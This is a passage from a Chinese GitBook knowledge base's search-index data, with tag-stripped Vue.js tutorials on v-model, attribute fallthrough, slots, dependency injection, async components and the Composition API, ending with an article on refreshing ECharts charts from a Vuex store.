进行更冗长的等价展开。因此上面的代码其实等价于下面这段： 而当使用在一个组件上时，v-model 会被展开为如下的形式： searchText = newValue\" /> 要让这个例子实际工作起来， 组件内部需要做两件事： 将内部原生 元素的 value attribute 绑定到 modelValue prop 当原生的 input 事件触发时，触发一个携带了新值的 update:modelValue 自定义事件 这里是相应的代码： export default { props: ['modelValue'], emits: ['update:modelValue'] } 现在 v-model 可以在这个组件上正常工作了 另一种在组件内实现 v-model 的方式是使用一个可写的，同时具有 getter 和 setter 的 computed 属性。get 方法需返回 modelValue prop，而 set 方法需触发相应的事件： export default { props: ['modelValue'], emits: ['update:modelValue'], computed: { value: { get() { return this.modelValue }, set(value) { this.$emit('update:modelValue', value) } } } } v-model 的参数 默认情况下，v-model 在组件上都是使用 modelValue 作为 prop，并以 update:modelValue 作为对应的事件。我们可以通过给 v-model 指定一个参数来更改这些名字： 在这个例子中，子组件应声明一个 title prop，并通过触发 update:title 事件更新父组件值： export default { props: ['title'], emits: ['update:title'] } 多个 v-model 绑定 利用刚才在 v-model 参数小节中学到的指定参数与事件名的技巧，我们可以在单个组件实例上创建多个 v-model 双向绑定。 组件上的每一个 v-model 都会同步不同的 prop，而无需额外的选项 export default { props: { firstName: String, lastName: String }, emits: ['update:firstName', 'update:lastName'] } 处理 v-model 修饰符 在学习输入绑定时，我们知道了 v-model 有一些内置的修饰符，例如 .trim，.number 和 .lazy。在某些场景下，你可能想要一个自定义组件的 v-model 支持自定义的修饰符。 我们来创建一个自定义的修饰符 capitalize，它会自动将 v-model 绑定输入的字符串值第一个字母转为大写： 组件的 v-model 上所添加的修饰符，可以通过 modelModifiers prop 在组件内访问到。在下面的组件中，我们声明了 modelModifiers 这个 prop，它的默认值是一个空对象： export default { props: { modelValue: String, modelModifiers: { default: () => ({}) } }, emits: ['update:modelValue'], created() { console.log(this.modelModifiers) // { capitalize: true } } } 注意这里组件的 modelModifiers prop 包含了 capitalize 且其值为 true，因为它在模板中的 v-model 绑定 v-model.capitalize=\"myText\" 上被使用了。 有了这个 prop，我们就可以检查 modelModifiers 对象的键，并编写一个处理函数来改变抛出的值。在下面的代码里，我们就是在每次 元素触发 input 事件时将值的首字母大写： export default { props: { modelValue: String, modelModifiers: { default: () => ({}) } }, emits: ['update:modelValue'], methods: { emitValue(e) { let value = e.target.value if (this.modelModifiers.capitalize) { value = value.charAt(0).toUpperCase() + value.slice(1) } this.$emit('update:modelValue', value) } } } 对于又有参数又有修饰符的 v-model 绑定，生成的 prop 名将是 arg + \"Modifiers\"。举例来说： 相应的声明应该是： export default { props: ['title', 'titleModifiers'], emits: ['update:title'], created() { console.log(this.titleModifiers) // { capitalize: true } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 15:05:34 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/18.透传 Attributes.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/18.透传 Attributes.html","title":"18.透传 Attributes","keywords":"","body":"透传 Attributes Attributes 继承 “透传 attribute”指的是传递给一个组件，却没有被该组件声明为 props 或 emits 的 attribute 或者 v-on 事件监听器。最常见的例子就是 class、style 和 id。 当一个组件以单个元素为根作渲染时，透传的 attribute 会自动被添加到根元素上。举例来说，假如我们有一个 组件，它的模板长这样: 的模板 --> click me 一个父组件使用了这个组件，并且传入了 class： 最后渲染出的 DOM 结果是： click me 这里， 并没有将 class 声明为一个它所接受的 prop，所以 class 被视作透传 attribute，自动透传到了 的根元素上。 对 class 和 style 的合并 如果一个子组件的根元素已经有了 class 或 style attribute，它会和从父组件上继承的值合并。如果我们将之前的 组件的模板改成这样： 的模板 --> click me 则最后渲染出的 DOM 结果会变成： click me v-on 监听器继承 同样的规则也适用于 v-on 事件监听器： click 监听器会被添加到 的根元素，即那个原生的 元素之上。当原生的 被点击，会触发父组件的 onClick 方法。同样的，如果原生 button 元素自身也通过 v-on 绑定了一个事件监听器，则这个监听器和从父组件继承的监听器都会被触发。 深层组件继承 有些情况下一个组件会在根节点上渲染另一个组件。例如，我们重构一下 ，让它在根节点上渲染 ： 的模板，只是渲染另一个组件 --> 此时 接收的透传 attribute 会直接继续传给 。 请注意： 透传的 attribute 不会包含 上声明过的 props 或是针对 emits 声明事件的 v-on 侦听函数，换句话说，声明过的 props 和侦听函数被 “消费”了。 透传的 attribute 若符合声明，也可以作为 props 传入 。 禁用 Attributes 继承 如果你不想要一个组件自动地继承 attribute，你可以在组件选项中设置 inheritAttrs: false。 最常见的需要禁用 attribute 继承的场景就是 attribute 需要应用在根节点以外的其他元素上。通过设置 inheritAttrs 选项为 false，你可以完全控制透传进来的 attribute 被如何使用。 这些透传进来的 attribute 可以在模板的表达式中直接用 $attrs 访问到。 Fallthrough attribute: {{ $attrs }} 这个 $attrs 对象包含了除组件所声明的 props 和 emits 之外的所有其他 attribute，例如 class，style，v-on 监听器等等。 有几点需要注意： 和 props 有所不同，透传 attributes 在 JavaScript 中保留了它们原始的大小写，所以像 foo-bar 这样的一个 attribute 需要通过 $attrs['foo-bar'] 来访问。 像 @click 这样的一个 v-on 事件监听器将在此对象下被暴露为一个函数 $attrs.onClick。 现在我们要再次使用一下之前小节中的 组件例子。有时候我们可能为了样式，需要在 元素外包装一层 ： click me 我们想要所有像 class 和 v-on 监听器这样的透传 attribute 都应用在内部的 上而不是外层的 上。我们可以通过设定 inheritAttrs: false 和使用 v-bind=\"$attrs\" 来实现： click me 小提示：没有参数的 v-bind 会将一个对象的所有属性都作为 attribute 应用到目标元素上。 多根节点的 Attributes 继承 和单根节点组件有所不同，有着多个根节点的组件没有自动 attribute 透传行为。如果 $attrs 没有被显式绑定，将会抛出一个运行时警告。 如果 有下面这样的多根节点模板，由于 Vue 不知道要将 attribute 透传到哪里，所以会抛出一个警告。 ... ... ... 如果 $attrs 被显式绑定，则不会有警告 ... ... ... 在 JavaScript 中访问透传 Attributes 如果需要，你可以通过 $attrs 这个实例属性来访问组件的所有透传 attribute： export default { created() { console.log(this.$attrs) } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 15:12:39 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/19.插槽 Slots.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/19.插槽 Slots.html","title":"19.插槽 Slots","keywords":"","body":"插槽 Slots 插槽内容与出口 在之前的章节中，我们已经了解到组件能够接收任意类型的 JavaScript 值作为 props，但组件要如何接收模板内容呢？在某些场景中，我们可能想要为子组件传递一些模板片段，让子组件在它们的组件中渲染这些片段。 举例来说，这里有一个 组件，可以像这样使用： Click me! 而 的模板是这样的： 元素是一个插槽出口 (slot outlet)，标示了父元素提供的插槽内容 (slot content) 将在哪里被渲染。 最终渲染出的 DOM 是这样： Click me! 通过使用插槽， 仅负责渲染外层的 (以及相应的样式)，而其内部的内容由父组件提供。 理解插槽的另一种方式是和下面的 JavaScript 函数作类比，其概念是类似的： // 父元素传入插槽内容 FancyButton('Click me!') // FancyButton 在自己的模板中渲染插槽内容 function FancyButton(slotContent) { return ` ${slotContent} ` } 插槽内容可以是任意合法的模板内容，不局限于文本。例如我们可以传入多个元素，甚至是组件： Click me! 通过使用插槽， 组件更加灵活和具有可复用性。现在组件可以用在不同的地方渲染各异的内容，但同时还保证都具有相同的样式。 Vue 组件的插槽机制是受原生 Web Component 元素的启发而诞生，同时还做了一些功能拓展，这些拓展的功能我们后面会学习到。 渲染作用域 插槽内容可以访问到父组件的数据作用域，因为插槽内容本身是在父组件模板中定义的。举例来说： {{ message }} {{ message }} 这里的两个 {{ message }} 插值表达式渲染的内容都是一样的。 插槽内容无法访问子组件的数据。Vue 模板中的表达式只能访问其定义时所处的作用域，这和 JavaScript 的词法作用域规则是一致的。换言之： [!NOTE] 父组件模板中的表达式只能访问父组件的作用域；子组件模板中的表达式只能访问子组件的作用域。 默认内容 在外部没有提供任何内容的情况下，可以为插槽指定默认内容。比如有这样一个 组件： 如果我们想在父组件没有提供任何插槽内容时在 内渲染“Submit”，只需要将“Submit”写在 标签之间来作为默认内容： Submit 现在，当我们在父组件中使用 且没有提供任何插槽内容时： “Submit”将会被作为默认内容渲染： Submit 但如果我们提供了插槽内容： Save 那么被显式提供的内容会取代默认内容： Save 具名插槽 有时在一个组件中包含多个插槽出口是很有用的。举例来说，在一个 组件中，有如下模板： 对于这种场景， 元素可以有一个特殊的 attribute name，用来给各个插槽分配唯一的 ID，以确定每一处要渲染的内容： 这类带 name 的插槽被称为具名插槽 (named slots)。没有提供 name 的 出口会隐式地命名为“default”。 在父组件中使用 时，我们需要一种方式将多个插槽内容传入到各自目标插槽的出口。此时就需要用到具名插槽了： 要为具名插槽传入内容，我们需要使用一个含 v-slot 指令的 元素，并将目标插槽的名字传给该指令： v-slot 有对应的简写 #，因此 可以简写为 。其意思就是“将这部分模板片段传入子组件的 header 插槽中\" 下面我们给出完整的、向 传递插槽内容的代码，指令均使用的是缩写形式： Here might be a page title A paragraph for the main content. And another one. Here's some contact info 当一个组件同时接收默认插槽和具名插槽时，所有位于顶级的非 节点都被隐式地视为默认插槽的内容。所以上面也可以写成： Here might be a page title A paragraph for the main content. And another one. Here's some contact info 现在 元素中的所有内容都将被传递到相应的插槽。最终渲染出的 HTML 如下： Here might be a page title A paragraph for the main content. And another one. Here's some contact info 使用 JavaScript 函数来类比可能更有助于你来理解具名插槽： // 传入不同的内容给不同名字的插槽 BaseLayout({ header: `...`, default: `...`, footer: `...` }) // 渲染插槽内容到对应位置 function BaseLayout(slots) { return ` ${slots.header} ${slots.default} ${slots.footer} ` } 动态插槽名 动态指令参数在 v-slot 上也是有效的，即可以定义下面这样的动态插槽名： ... ... 注意这里的表达式和动态指令参数受相同的语法限制。 作用域插槽 在上面的渲染作用域中我们讨论到，插槽的内容无法访问到子组件的状态。 然而在某些场景下插槽的内容可能想要同时使用父组件域内和子组件域内的数据。要做到这一点，我们需要一种方法来让子组件在渲染时将一部分数据提供给插槽。 我们也确实有办法这么做！可以像对组件传递 props 那样，向一个插槽的出口上传递 attributes： 的模板 --> 当需要接收插槽 props 时，默认插槽和具名插槽的使用方式有一些小区别。下面我们将先展示默认插槽如何接受 props，通过子组件标签上的 v-slot 指令，直接接收到了一个插槽 props 对象： {{ slotProps.text }} {{ slotProps.count }} 子组件传入插槽的 props 作为了 v-slot 指令的值，可以在插槽内的表达式中访问。 你可以将作用域插槽类比为一个传入子组件的函数。子组件会将相应的 props 作为参数传给它 MyComponent({ // 类比默认插槽，将其想成一个函数 default: (slotProps) => { return `${slotProps.text} ${slotProps.count}` } }) function MyComponent(slots) { const greetingMessage = 'hello' return `${ // 在插槽函数调用时传入 props slots.default({ text: greetingMessage, count: 1 }) }` } 实际上，这已经和作用域插槽的最终代码编译结果、以及手动编写渲染函数时使用作用域插槽的方式非常类似了。 v-slot=\"slotProps\" 可以类比这里的函数签名，和函数的参数类似，我们也可以在 v-slot 中使用解构： {{ text }} {{ count }} 具名作用域插槽 具名作用域插槽的工作方式也是类似的，插槽 props 可以作为 v-slot 指令的值被访问到：v-slot:name=\"slotProps\"。当使用缩写时是这样： {{ headerProps }} {{ defaultProps }} {{ footerProps }} 向具名插槽中传入 props： 注意插槽上的 name 是一个 Vue 特别保留的 attribute，不会作为 props 传递给插槽。因此最终 headerProps 的结果是 { message: 'hello' }。 如果你同时使用了具名插槽与默认插槽，则需要为默认插槽使用显式的 标签。尝试直接为组件添加 v-slot 指令将导致编译错误。这是为了避免因默认插槽的 props 的作用域而困惑。举例： {{ message }} {{ message }} 为默认插槽使用显式的 标签有助于更清晰地指出 message 属性在其他插槽中不可用： {{ message }} Here's some contact info 高级列表组件示例 你可能想问什么样的场景才适合用到作用域插槽，这里我们来看一个 组件的例子。它会渲染一个列表，并同时会封装一些加载远端数据的逻辑、使用数据进行列表渲染、或者是像分页或无限滚动这样更进阶的功能。然而我们希望它能够保留足够的灵活性，将对单个列表元素内容和样式的控制权留给使用它的父组件。我们期望的用法可能是这样的： {{ body }} by {{ username }} | {{ likes }} likes 在 之中，我们可以多次渲染 并每次都提供不同的数据 (注意我们这里使用了 v-bind 来传递插槽的 props): 无渲染组件 上面的 案例同时封装了可重用的逻辑 (数据获取、分页等) 和视图输出，但也将部分视图输出通过作用域插槽交给了消费者组件来管理。 如果我们将这个概念拓展一下，可以想象的是，一些组件可能只包括了逻辑而不需要自己渲染内容，视图输出通过作用域插槽全权交给了消费者组件。我们将这种类型的组件称为无渲染组件。 这里有一个无渲染组件的例子，一个封装了追踪当前鼠标位置逻辑的组件： Mouse is at: {{ x }}, {{ y }} 虽然这个模式很有趣，但大部分能用无渲染组件实现的功能都可以通过组合式 API 以另一种更高效的方式实现，并且还不会带来额外组件嵌套的开销。之后我们会在组合式函数一章中介绍如何更高效地实现追踪鼠标位置的功能。 尽管如此，作用域插槽在需要同时封装逻辑、组合视图界面时还是很有用，就像上面的 组件那样。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 16:10:34 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/20.依赖注入.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/20.依赖注入.html","title":"20.依赖注入","keywords":"","body":"依赖注入 Prop 逐级透传问题 通常情况下，当我们需要从父组件向子组件传递数据时，会使用 props。想象一下这样的结构：有一些多层级嵌套的组件，形成了一颗巨大的组件树，而某个深层的子组件需要一个较远的祖先组件中的部分数据。在这种情况下，如果仅使用 props 则必须将其沿着组件链逐级传递下去，这会非常麻烦： 注意，虽然这里的 组件可能根本不关心这些 props，但为了使 能访问到它们，仍然需要定义并向下传递。如果组件链路非常长，可能会影响到更多这条路上的组件。这一问题被称为“prop 逐级透传”，显然是我们希望尽量避免的情况。 provide 和 inject 可以帮助我们解决这一问题。 [1] 一个父组件相对于其所有的后代组件，会作为依赖提供者。任何后代的组件树，无论层级有多深，都可以注入由父组件提供给整条链路的依赖。 Provide (提供) 要为组件后代提供数据，需要使用到 provide 选项： export default { provide: { message: 'hello!' } } 对于 provide 对象上的每一个属性，后代组件会用其 key 为注入名查找期望注入的值，属性的值就是要提供的数据。 如果我们需要提供依赖当前组件实例的状态 (比如那些由 data() 定义的数据属性)，那么可以以函数形式使用 provide： export default { data() { return { message: 'hello!' } }, provide() { // 使用函数的形式，可以访问到 `this` return { message: this.message } } } 然而，请注意这不会使注入保持响应性。我们会在后续小节中讨论如何让注入转变为响应式。 应用层 Provide 除了在一个组件中提供依赖，我们还可以在整个应用层面提供依赖： import { createApp } from 'vue' const app = createApp({}) app.provide(/* 注入名 */ 'message', /* 值 */ 'hello!') 在应用级别提供的数据在该应用内的所有组件中都可以注入。这在你编写插件时会特别有用，因为插件一般都不会使用组件形式来提供值。 Inject (注入) 要注入上层组件提供的数据，需使用 inject 选项来声明： export default { inject: ['message'], created() { console.log(this.message) // injected value } } 注入会在组件自身的状态之前被解析，因此你可以在 data() 中访问到注入的属性： export default { inject: ['message'], data() { return { // 基于注入值的初始数据 fullMessage: this.message } } } 注入别名 当以数组形式使用 inject，注入的属性会以同名的 key 暴露到组件实例上。在上面的例子中，提供的属性名为 \"message\"，注入后以 this.message 的形式暴露。访问的本地属性名和注入名是相同的。 如果我们想要用一个不同的本地属性名注入该属性，我们需要在 inject 选项的属性上使用对象的形式： export default { inject: { /* 本地属性名 */ localMessage: { from: /* 注入来源名 */ 'message' } } } 这里，组件本地化了原注入名 \"message\" 所提供的属性，并将其暴露为 this.localMessage。 注入默认值 默认情况下，inject 假设传入的注入名会被某个祖先链上的组件提供。如果该注入名的确没有任何组件提供，则会抛出一个运行时警告。 如果在注入一个值时不要求必须有提供者，那么我们应该声明一个默认值，和 props 类似： export default { // 当声明注入的默认值时 // 必须使用对象形式 inject: { message: { from: 'message', // 当与原注入名同名时，这个属性是可选的 default: 'default value' }, user: { // 对于非基础类型数据，如果创建开销比较大，或是需要确保每个组件实例 // 需要独立数据的，请使用工厂函数 default: () => ({ name: 'John' }) } } } 和响应式数据配合使用 为保证注入方和供给方之间的响应性链接，我们需要使用 computed() 函数提供一个计算属性 import { computed } from 'vue' export default { data() { return { message: 'hello!' } }, provide() { return { // 显式提供一个计算属性 message: computed(() => this.message) } } } computed() 函数常用于组合式 API 风格的组件中，但它同样还可以用于补充选项式 API 风格的某些用例。你可以通过阅读响应式系统基础和计算属性两个章节了解更多组合式的 API 风格 [!WARNING] 临时配置要求 上面的用例需要设置 app.config.unwrapInjectedRef = true 以保证注入会自动解包这个计算属性。这将会在 Vue 3.3 后成为一个默认行为，而我们暂时在此告知此项配置以避免后续升级对代码的破坏性。在 3.3 后就不需要这样做了。 使用 Symbol 作注入名 至此，我们已经了解了如何使用字符串作为注入名。但如果你正在构建大型的应用，包含非常多的依赖提供，或者你正在编写提供给其他开发者使用的组件库，建议最好使用 Symbol 来作为注入名以避免潜在的冲突。 我们通常推荐在一个单独的文件中导出这些注入名 Symbol： // keys.js export const myInjectionKey = Symbol() // 在供给方组件中 import { myInjectionKey } from './keys.js' export default { provide() { return { [myInjectionKey]: { /* 要提供的数据 */ } } } } // 注入方组件 import { myInjectionKey } from './keys.js' export default { inject: { injected: { from: myInjectionKey } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 17:01:49 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/21.异步组件.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/21.异步组件.html","title":"21.异步组件","keywords":"","body":"异步组件 基本用法 在大型项目中，我们可能需要拆分应用为更小的块，并仅在需要时再从服务器加载相关组件。Vue 提供了 defineAsyncComponent 方法来实现此功能： import { defineAsyncComponent } from 'vue' const AsyncComp = defineAsyncComponent(() => { return new Promise((resolve, reject) => { // ...从服务器获取组件 resolve(/* 获取到的组件 */) }) }) // ... 像使用其他一般组件一样使用 `AsyncComp` 如你所见，defineAsyncComponent 方法接收一个返回 Promise 的加载函数。这个 Promise 的 resolve 回调方法应该在从服务器获得组件定义时调用。你也可以调用 reject(reason) 表明加载失败。 ES 模块动态导入也会返回一个 Promise，所以多数情况下我们会将它和 defineAsyncComponent 搭配使用。类似 Vite 和 Webpack 这样的构建工具也支持此语法 (并且会将它们作为打包时的代码分割点)，因此我们也可以用它来导入 Vue 单文件组件： import { defineAsyncComponent } from 'vue' const AsyncComp = defineAsyncComponent(() => import('./components/MyComponent.vue') ) 最后得到的 AsyncComp 是一个外层包装过的组件，仅在页面需要它渲染时才会调用加载内部实际组件的函数。它会将接收到的 props 和插槽传给内部组件，所以你可以使用这个异步的包装组件无缝地替换原始组件，同时实现延迟加载。 与普通组件一样，异步组件可以使用 app.component() 全局注册： app.component('MyComponent', defineAsyncComponent(() => import('./components/MyComponent.vue') )) 你也可以在局部注册组件时使用 defineAsyncComponent： import { defineAsyncComponent } from 'vue' export default { components: { AdminPage: defineAsyncComponent(() => import('./components/AdminPageComponent.vue') ) } } 加载与错误状态 异步操作不可避免地会涉及到加载和错误状态，因此 defineAsyncComponent() 也支持在高级选项中处理这些状态： const AsyncComp = defineAsyncComponent({ // 加载函数 loader: () => import('./Foo.vue'), // 加载异步组件时使用的组件 loadingComponent: LoadingComponent, // 展示加载组件前的延迟时间，默认为 200ms delay: 200, // 加载失败后展示的组件 errorComponent: ErrorComponent, // 如果提供了一个 timeout 时间限制，并超时了 // 也会显示这里配置的报错组件，默认值是：Infinity timeout: 3000 }) 如果提供了一个加载组件，它将在内部组件加载时先行显示。在加载组件显示之前有一个默认的 200ms 延迟——这是因为在网络状况较好时，加载完成得很快，加载组件和最终组件之间的替换太快可能产生闪烁，反而影响用户感受。 如果提供了一个报错组件，则它会在加载器函数返回的 Promise 抛错时被渲染。你还可以指定一个超时时间，在请求耗时超过指定时间时也会渲染报错组件。 搭配 Suspense 使用 异步组件可以搭配内置的 组件一起使用，若想了解 和异步组件之间交互，请参阅 章节。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 17:04:44 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/22.组合式API.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/22.组合式API.html","title":"22.组合式API","keywords":"","body":"简介 Vue3 组合式 API（Composition API） 主要用于在大型组件中提高代码逻辑的可复用性。 传统的组件随着业务复杂度越来越高，代码量会不断的加大，整个代码逻辑都不易阅读和理解。 Vue3 使用组合式 API 的地方为 setup。 在 setup 中，我们可以按逻辑关注点对部分代码进行分组，然后提取逻辑片段并与其他组件共享代码。因此，组合式 API（Composition API） 允许我们编写更有条理的代码。 选项式 VS 组合式 选项式 在vue2 中，我们使用选项式Api，这样将整个层级分得很清楚，响应式数据全在data()函数中，created()则是生命周期函数，methods则是所有执行的方法，computed则是计算属性等等，这样对于新手来说很简单就能掌握学习vue的层级关系，以及对响应式数据的理解 export default{ data(){ return{ isShow: flase } }, created(){ this.show() }, methods:{ show(){ this.isShow = true } }, computed:{ } } 组合式 组合式Api，使用setup函数，在其内部声明响应式或非响应式变量，定义方法，虽然没有像选项式那样分明层级关系，但是是用户自己编写的结构，在大型项目中就能体现出逻辑性更优秀，且用户可以按逻辑关注点对部分代码进行分组，对于后期维护，可以减少不少的工作量 import { ref, onMounted } from 'vue' export default { setup(){ const name = ref('Compostion Api') const showName = () => { console.log(`Hello ${name.value}`) } const status = ref(false) const changeStatus = () => { status.value = true } onMounted(() => { showName() }) return { name, status, changeStatus} } } 在Vue3.2及以上版本，setup语法糖，完全替代了setup函数，不用再return变量了 import {ref,onMounted} from 'vue' const name = ref('Compostion Api') const showName = () => { console.log(`Hello ${name.value}`) } const status = ref(false) const changeStatus = () => { status.value = true } onMounted(() => { showName() }) setup()组件 setup() 函数在组件创建 created() 之前执行 setup() 函数接收两个参数 props 和 context 第一个参数 props，它是响应式的，当传入新的 prop 时，它将被更新。 第二个参数 context 是一个普通的 JavaScript 对象，它是一个上下文对象，暴露了其它可能在 setup 中有用的值 [!WARNING] 注意： 在 setup 中你应该避免使用 this，因为它不会找到组件实例。setup 的调用发生在 data property、computed property 或 methods 被解析之前，所以它们无法在 setup 中被获取。 以下实例使用组合 API 定义一个计数器 计数器实例: {{ count }} import {ref, onMounted} from 'vue'; export default { setup(){ //定义初始值为0的变量，要使用ref方法赋值，直接赋值的话变量改变不会更新 UI let count = ref(0); // 定义点击事件 myFn function myFn(){ console.log(count); count.value += 1; } // 组件被挂载时，我们用 onMounted 钩子记录一些消息 onMounted(() => console.log('component mounted!')); // 外部使用组合API中定义的变量或方法，在模板中可用。 return {count,myFn} // 返回的函数与方法的行为相同 } } 在 Vue 3.0 中，我们可以通过一个新的 ref 函数使任何响应式变量在任何地方起作用，如下所示： import { ref } from 'vue' let count = ref(0); ref() 函数可以根据给定的值来创建一个响应式的数据对象，返回值是一个对象，且只包含一个 .value 属性。 在 setup() 函数内，由 ref() 创建的响应式数据返回的是对象，所以需要用 .value 来访问。 import { ref } from 'vue' const counter = ref(0) console.log(counter) // { value: 0 } console.log(counter.value) // 0 counter.value++ console.log(counter.value) // 1 Vue 组合式 API 生命周期钩子 在 Vue2 中，我们通过以下方式实现生命周期钩子函数 export default { beforeMount() { console.log('V2 beforeMount!') }, mounted() { console.log('V2 mounted!') } } 在 Vue3 组合 API 中实现生命周期钩子函数可以在 setup() 函数中使用带有 on 前缀的函数： import { onBeforeMount, onMounted } from 'vue'; export default { setup() { onBeforeMount(() => { console.log('V3 beforeMount!'); }) onMounted(() => { console.log('V3 mounted!'); }) } } 下表为 Options API 和 Composition API 之间的映射，包含如何在 setup () 内部调用生命周期钩子： Vue2 Options-based API Vue Composition API beforeCreate setup() created setup() beforeMount onBeforeMount mounted onMounted beforeUpdate onBeforeUpdate updated onUpdated beforeDestroy onBeforeUnmount destroyed onUnmounted errorCaptured onErrorCaptured 因为 setup 是围绕 beforeCreate 和 created 生命周期钩子运行的，所以不需要显式地定义它们。换句话说，在这些钩子中编写的任何代码都应该直接在 setup 函数中编写。 setup() { ... // 组件被挂载时，我们用 onMounted 钩子记录一些消息 onMounted(() => console.log('component mounted!')); ... } 模板引用 在使用组合式 API 时，响应式引用和模板引用的概念是统一的。 为了获得对模板内元素或组件实例的引用，我们可以像往常一样声明 ref 并从 setup() 返回 This is a root element import { ref, onMounted } from 'vue' export default { setup() { const root = ref(null) onMounted(() => { // DOM 元素将在初始渲染后分配给 ref console.log(root.value) // This is a root element }) return { root } } } 以上实例中我们在渲染上下文中暴露 root，并通过 ref=\"root\"，将其绑定到 div 作为其 ref。 作为模板使用的 ref 的行为与任何其他 ref 一样：它们是响应式的，可以传递到 (或从中返回) 复合函数中。 v-for 中的用法 组合式 API 模板引用在 v-for 内部使用时没有特殊处理。相反，请使用函数引用执行自定义处理： { if (el) divs[i] = el }\"> {{ item }} import { ref, reactive, onBeforeUpdate } from 'vue' export default { setup() { const list = reactive([1, 2, 3]) const divs = ref([]) // 确保在每次更新之前重置ref onBeforeUpdate(() => { divs.value = [] }) return { list, divs } } } 侦听模板引用 侦听模板引用的变更可以替代前面例子中演示使用的生命周期钩子。 但与生命周期钩子的一个关键区别是，watch() 和 watchEffect() 在 DOM 挂载或更新之前运行会有副作用，所以当侦听器运行时，模板引用还未被更新。 This is a root element import { ref, watchEffect } from 'vue' export default { setup() { const root = ref(null) watchEffect(() => { // 这个副作用在 DOM 更新之前运行，因此，模板引用还没有持有对元素的引用。 console.log(root.value) // => null }) return { root } } } 因此，使用模板引用的侦听器应该用 flush: 'post' 选项来定义，这将在 DOM 更新后运行副作用，确保模板引用与 DOM 保持同步，并引用正确的元素。 This is a root element import { ref, watchEffect } from 'vue' export default { setup() { const root = ref(null) watchEffect(() => { console.log(root.value) // => This is a root element }, { flush: 'post' }) return { root } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-05 15:18:44 "},"知识库/04.编程开发/03.Web前端/99.其他/01.使用Vuex做Echarts数据当页面初始化后如何更新dom.html":{"url":"知识库/04.编程开发/03.Web前端/99.其他/01.使用Vuex做Echarts数据当页面初始化后如何更新dom.html","title":"01.使用Vuex做Echarts数据当页面初始化后如何更新dom","keywords":"","body":"使用Vuex做Echarts数据当页面初始化后如何更新dom 需求 子组件只装载数据，不进行HTTP请求，父组件在created的时候，拿到数据之后，并存入到store中,要求在异步I/O操作之后再重新渲染dom 问题描述 子组件为echarts图表，当子组件取数据时，由于echarts图表dom已经渲染，异步I/O操作在页面渲染之后才会将数据存入store中，使用computed计算属性获取object，初值为{}，当页面渲染完成，计算得到object不能被watch属性监听，故不能将新计算出数据重新渲染并显示在页面中（只针对echarts初始化渲染dom为初值，数据修改之后无法响应式修改的问题） 代码分析 // vuex import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) export default new Vuex.Store({ state: { obj: { success: 0, error: 0, pending: 0 } }, mutations: { setObj (state, data) { state.obj.success = data.success state.obj.error = data.error state.obj.pending = data.pending } }, actions: { }, modules: { } }) 子组件 i'm test page // import { mapState } from 'vuex' export default { data () { return { } }, mounted () { this.renderBarChart() }, methods: { renderBarChart () { const chart = this.$refs.basicBarChart const myChart = this.$echarts.init(chart) if (myChart) { myChart.setOption({ tooltip: { trigger: 'item', formatter: '{a} {b} : {c} ({d}%)' }, legend: { orient: 'vertical', left: 'left ', data: ['成功', '失败', '验证'] }, series: [ { name: '测试', type: 'pie', radius: '55%', data: [ { value: this.obj.success, name: '成功' }, { value: this.obj.error, name: '失败' }, { value: this.obj.pending, name: '验证' } ], emphasis: { itemStyle: { shadowBlur: 10, shadowOffsetX: 0, shadowColor: 'rgba(0, 0, 0, 0.5)' } } } ] }) window.addEventListener('resize', function () { myChart.resize() }) } this.$on('hook:destroyed', () => { window.removeEventListener('resize', function () { myChart.resize() }) }) } }, computed: { obj () { return this.$store.state.obj } }, watch: { obj (newVal, oldVal) { console.log(newVal) } } } 父组件 import add from '@/components/add' export default { data () { return { } }, mounted () { this.getTest() }, beforeDestroy () { this.$store.commit('count/setObj', { success: 0, error: 0, pending: 0 }) }, methods: { async getTest () { setTimeout(() => { this.$store.commit('setObj', { success: Math.ceil(Math.random() * 100), error: Math.ceil(Math.random() * 100), pending: Math.ceil(Math.random() * 100) }) }, 2000) } }, components: { 'my-add': add } } 效果图如下，可以看到echarts图表未更新，这里模拟了一个异步操作，2s之后，父组件才把数据写入store中 我们知道，computed属性的数据为响应式数据，那么为什么echarts图表未更新呢？我们看代码 // import { mapState } from 'vuex' export default { data () { return { } }, mounted () { this.renderBarChart() }, methods: { renderBarChart () { } }, computed: { obj () { return this.$store.state.obj } } } dom渲染之后，也就是mounted的时候，调用renderBarChart函数，这个时候对dom进行渲染，而正在这个时候，computed计算出来的值为初值obj:{success: 0,error: 0,pending: 0}，而就在这时就已经渲染dom到页面上，而当得到真正的数据之后，dom已经渲染完成了，而我们使用renderBarChart函数中的数据虽然是响应式数据，但是需要再调用一次这个函数才能重新渲染这个dom 那么如何重新渲染这个dom呢？ 0x1 声明式渲染&&update钩子 最简单的做法是将变量obj放置在dom中，因为obj为响应式数据，当obj在dom里发生改变，随即调用update钩子，dom被修改，再手动调用renderBarChart函数将echarts的canvas dom重新渲染 子组件 i'm test page {{obj}} export default{ updated(){ this.renderBarChart() }, // ...略 } 初始化页面 异步I/O得到数据之后 当然，将数据放置在dom中，是很影响美观的，这时候可以使用css display:none修饰一下 {{obj}} 0x2 深度监听 Vue中的watch 方法其实默认写的是handler函数，Vue.js会去处理这个逻辑，最终编译出来其实就是这个handler Vue 不能检测到对象属性的添加或删除。由于 Vue 会在初始化实例时对属性执行 getter/setter 转化过程，所以属性必须在 data 对象上存在才能让 Vue 转换它，这样才能让它是响应的，默认情况下 handler 只监听obj这个属性它的引用的变化，我们只有整个obj赋值的时候它才会监听到 如果我们需要监听obj里的属性的值呢？这时候就要用上deep属性了 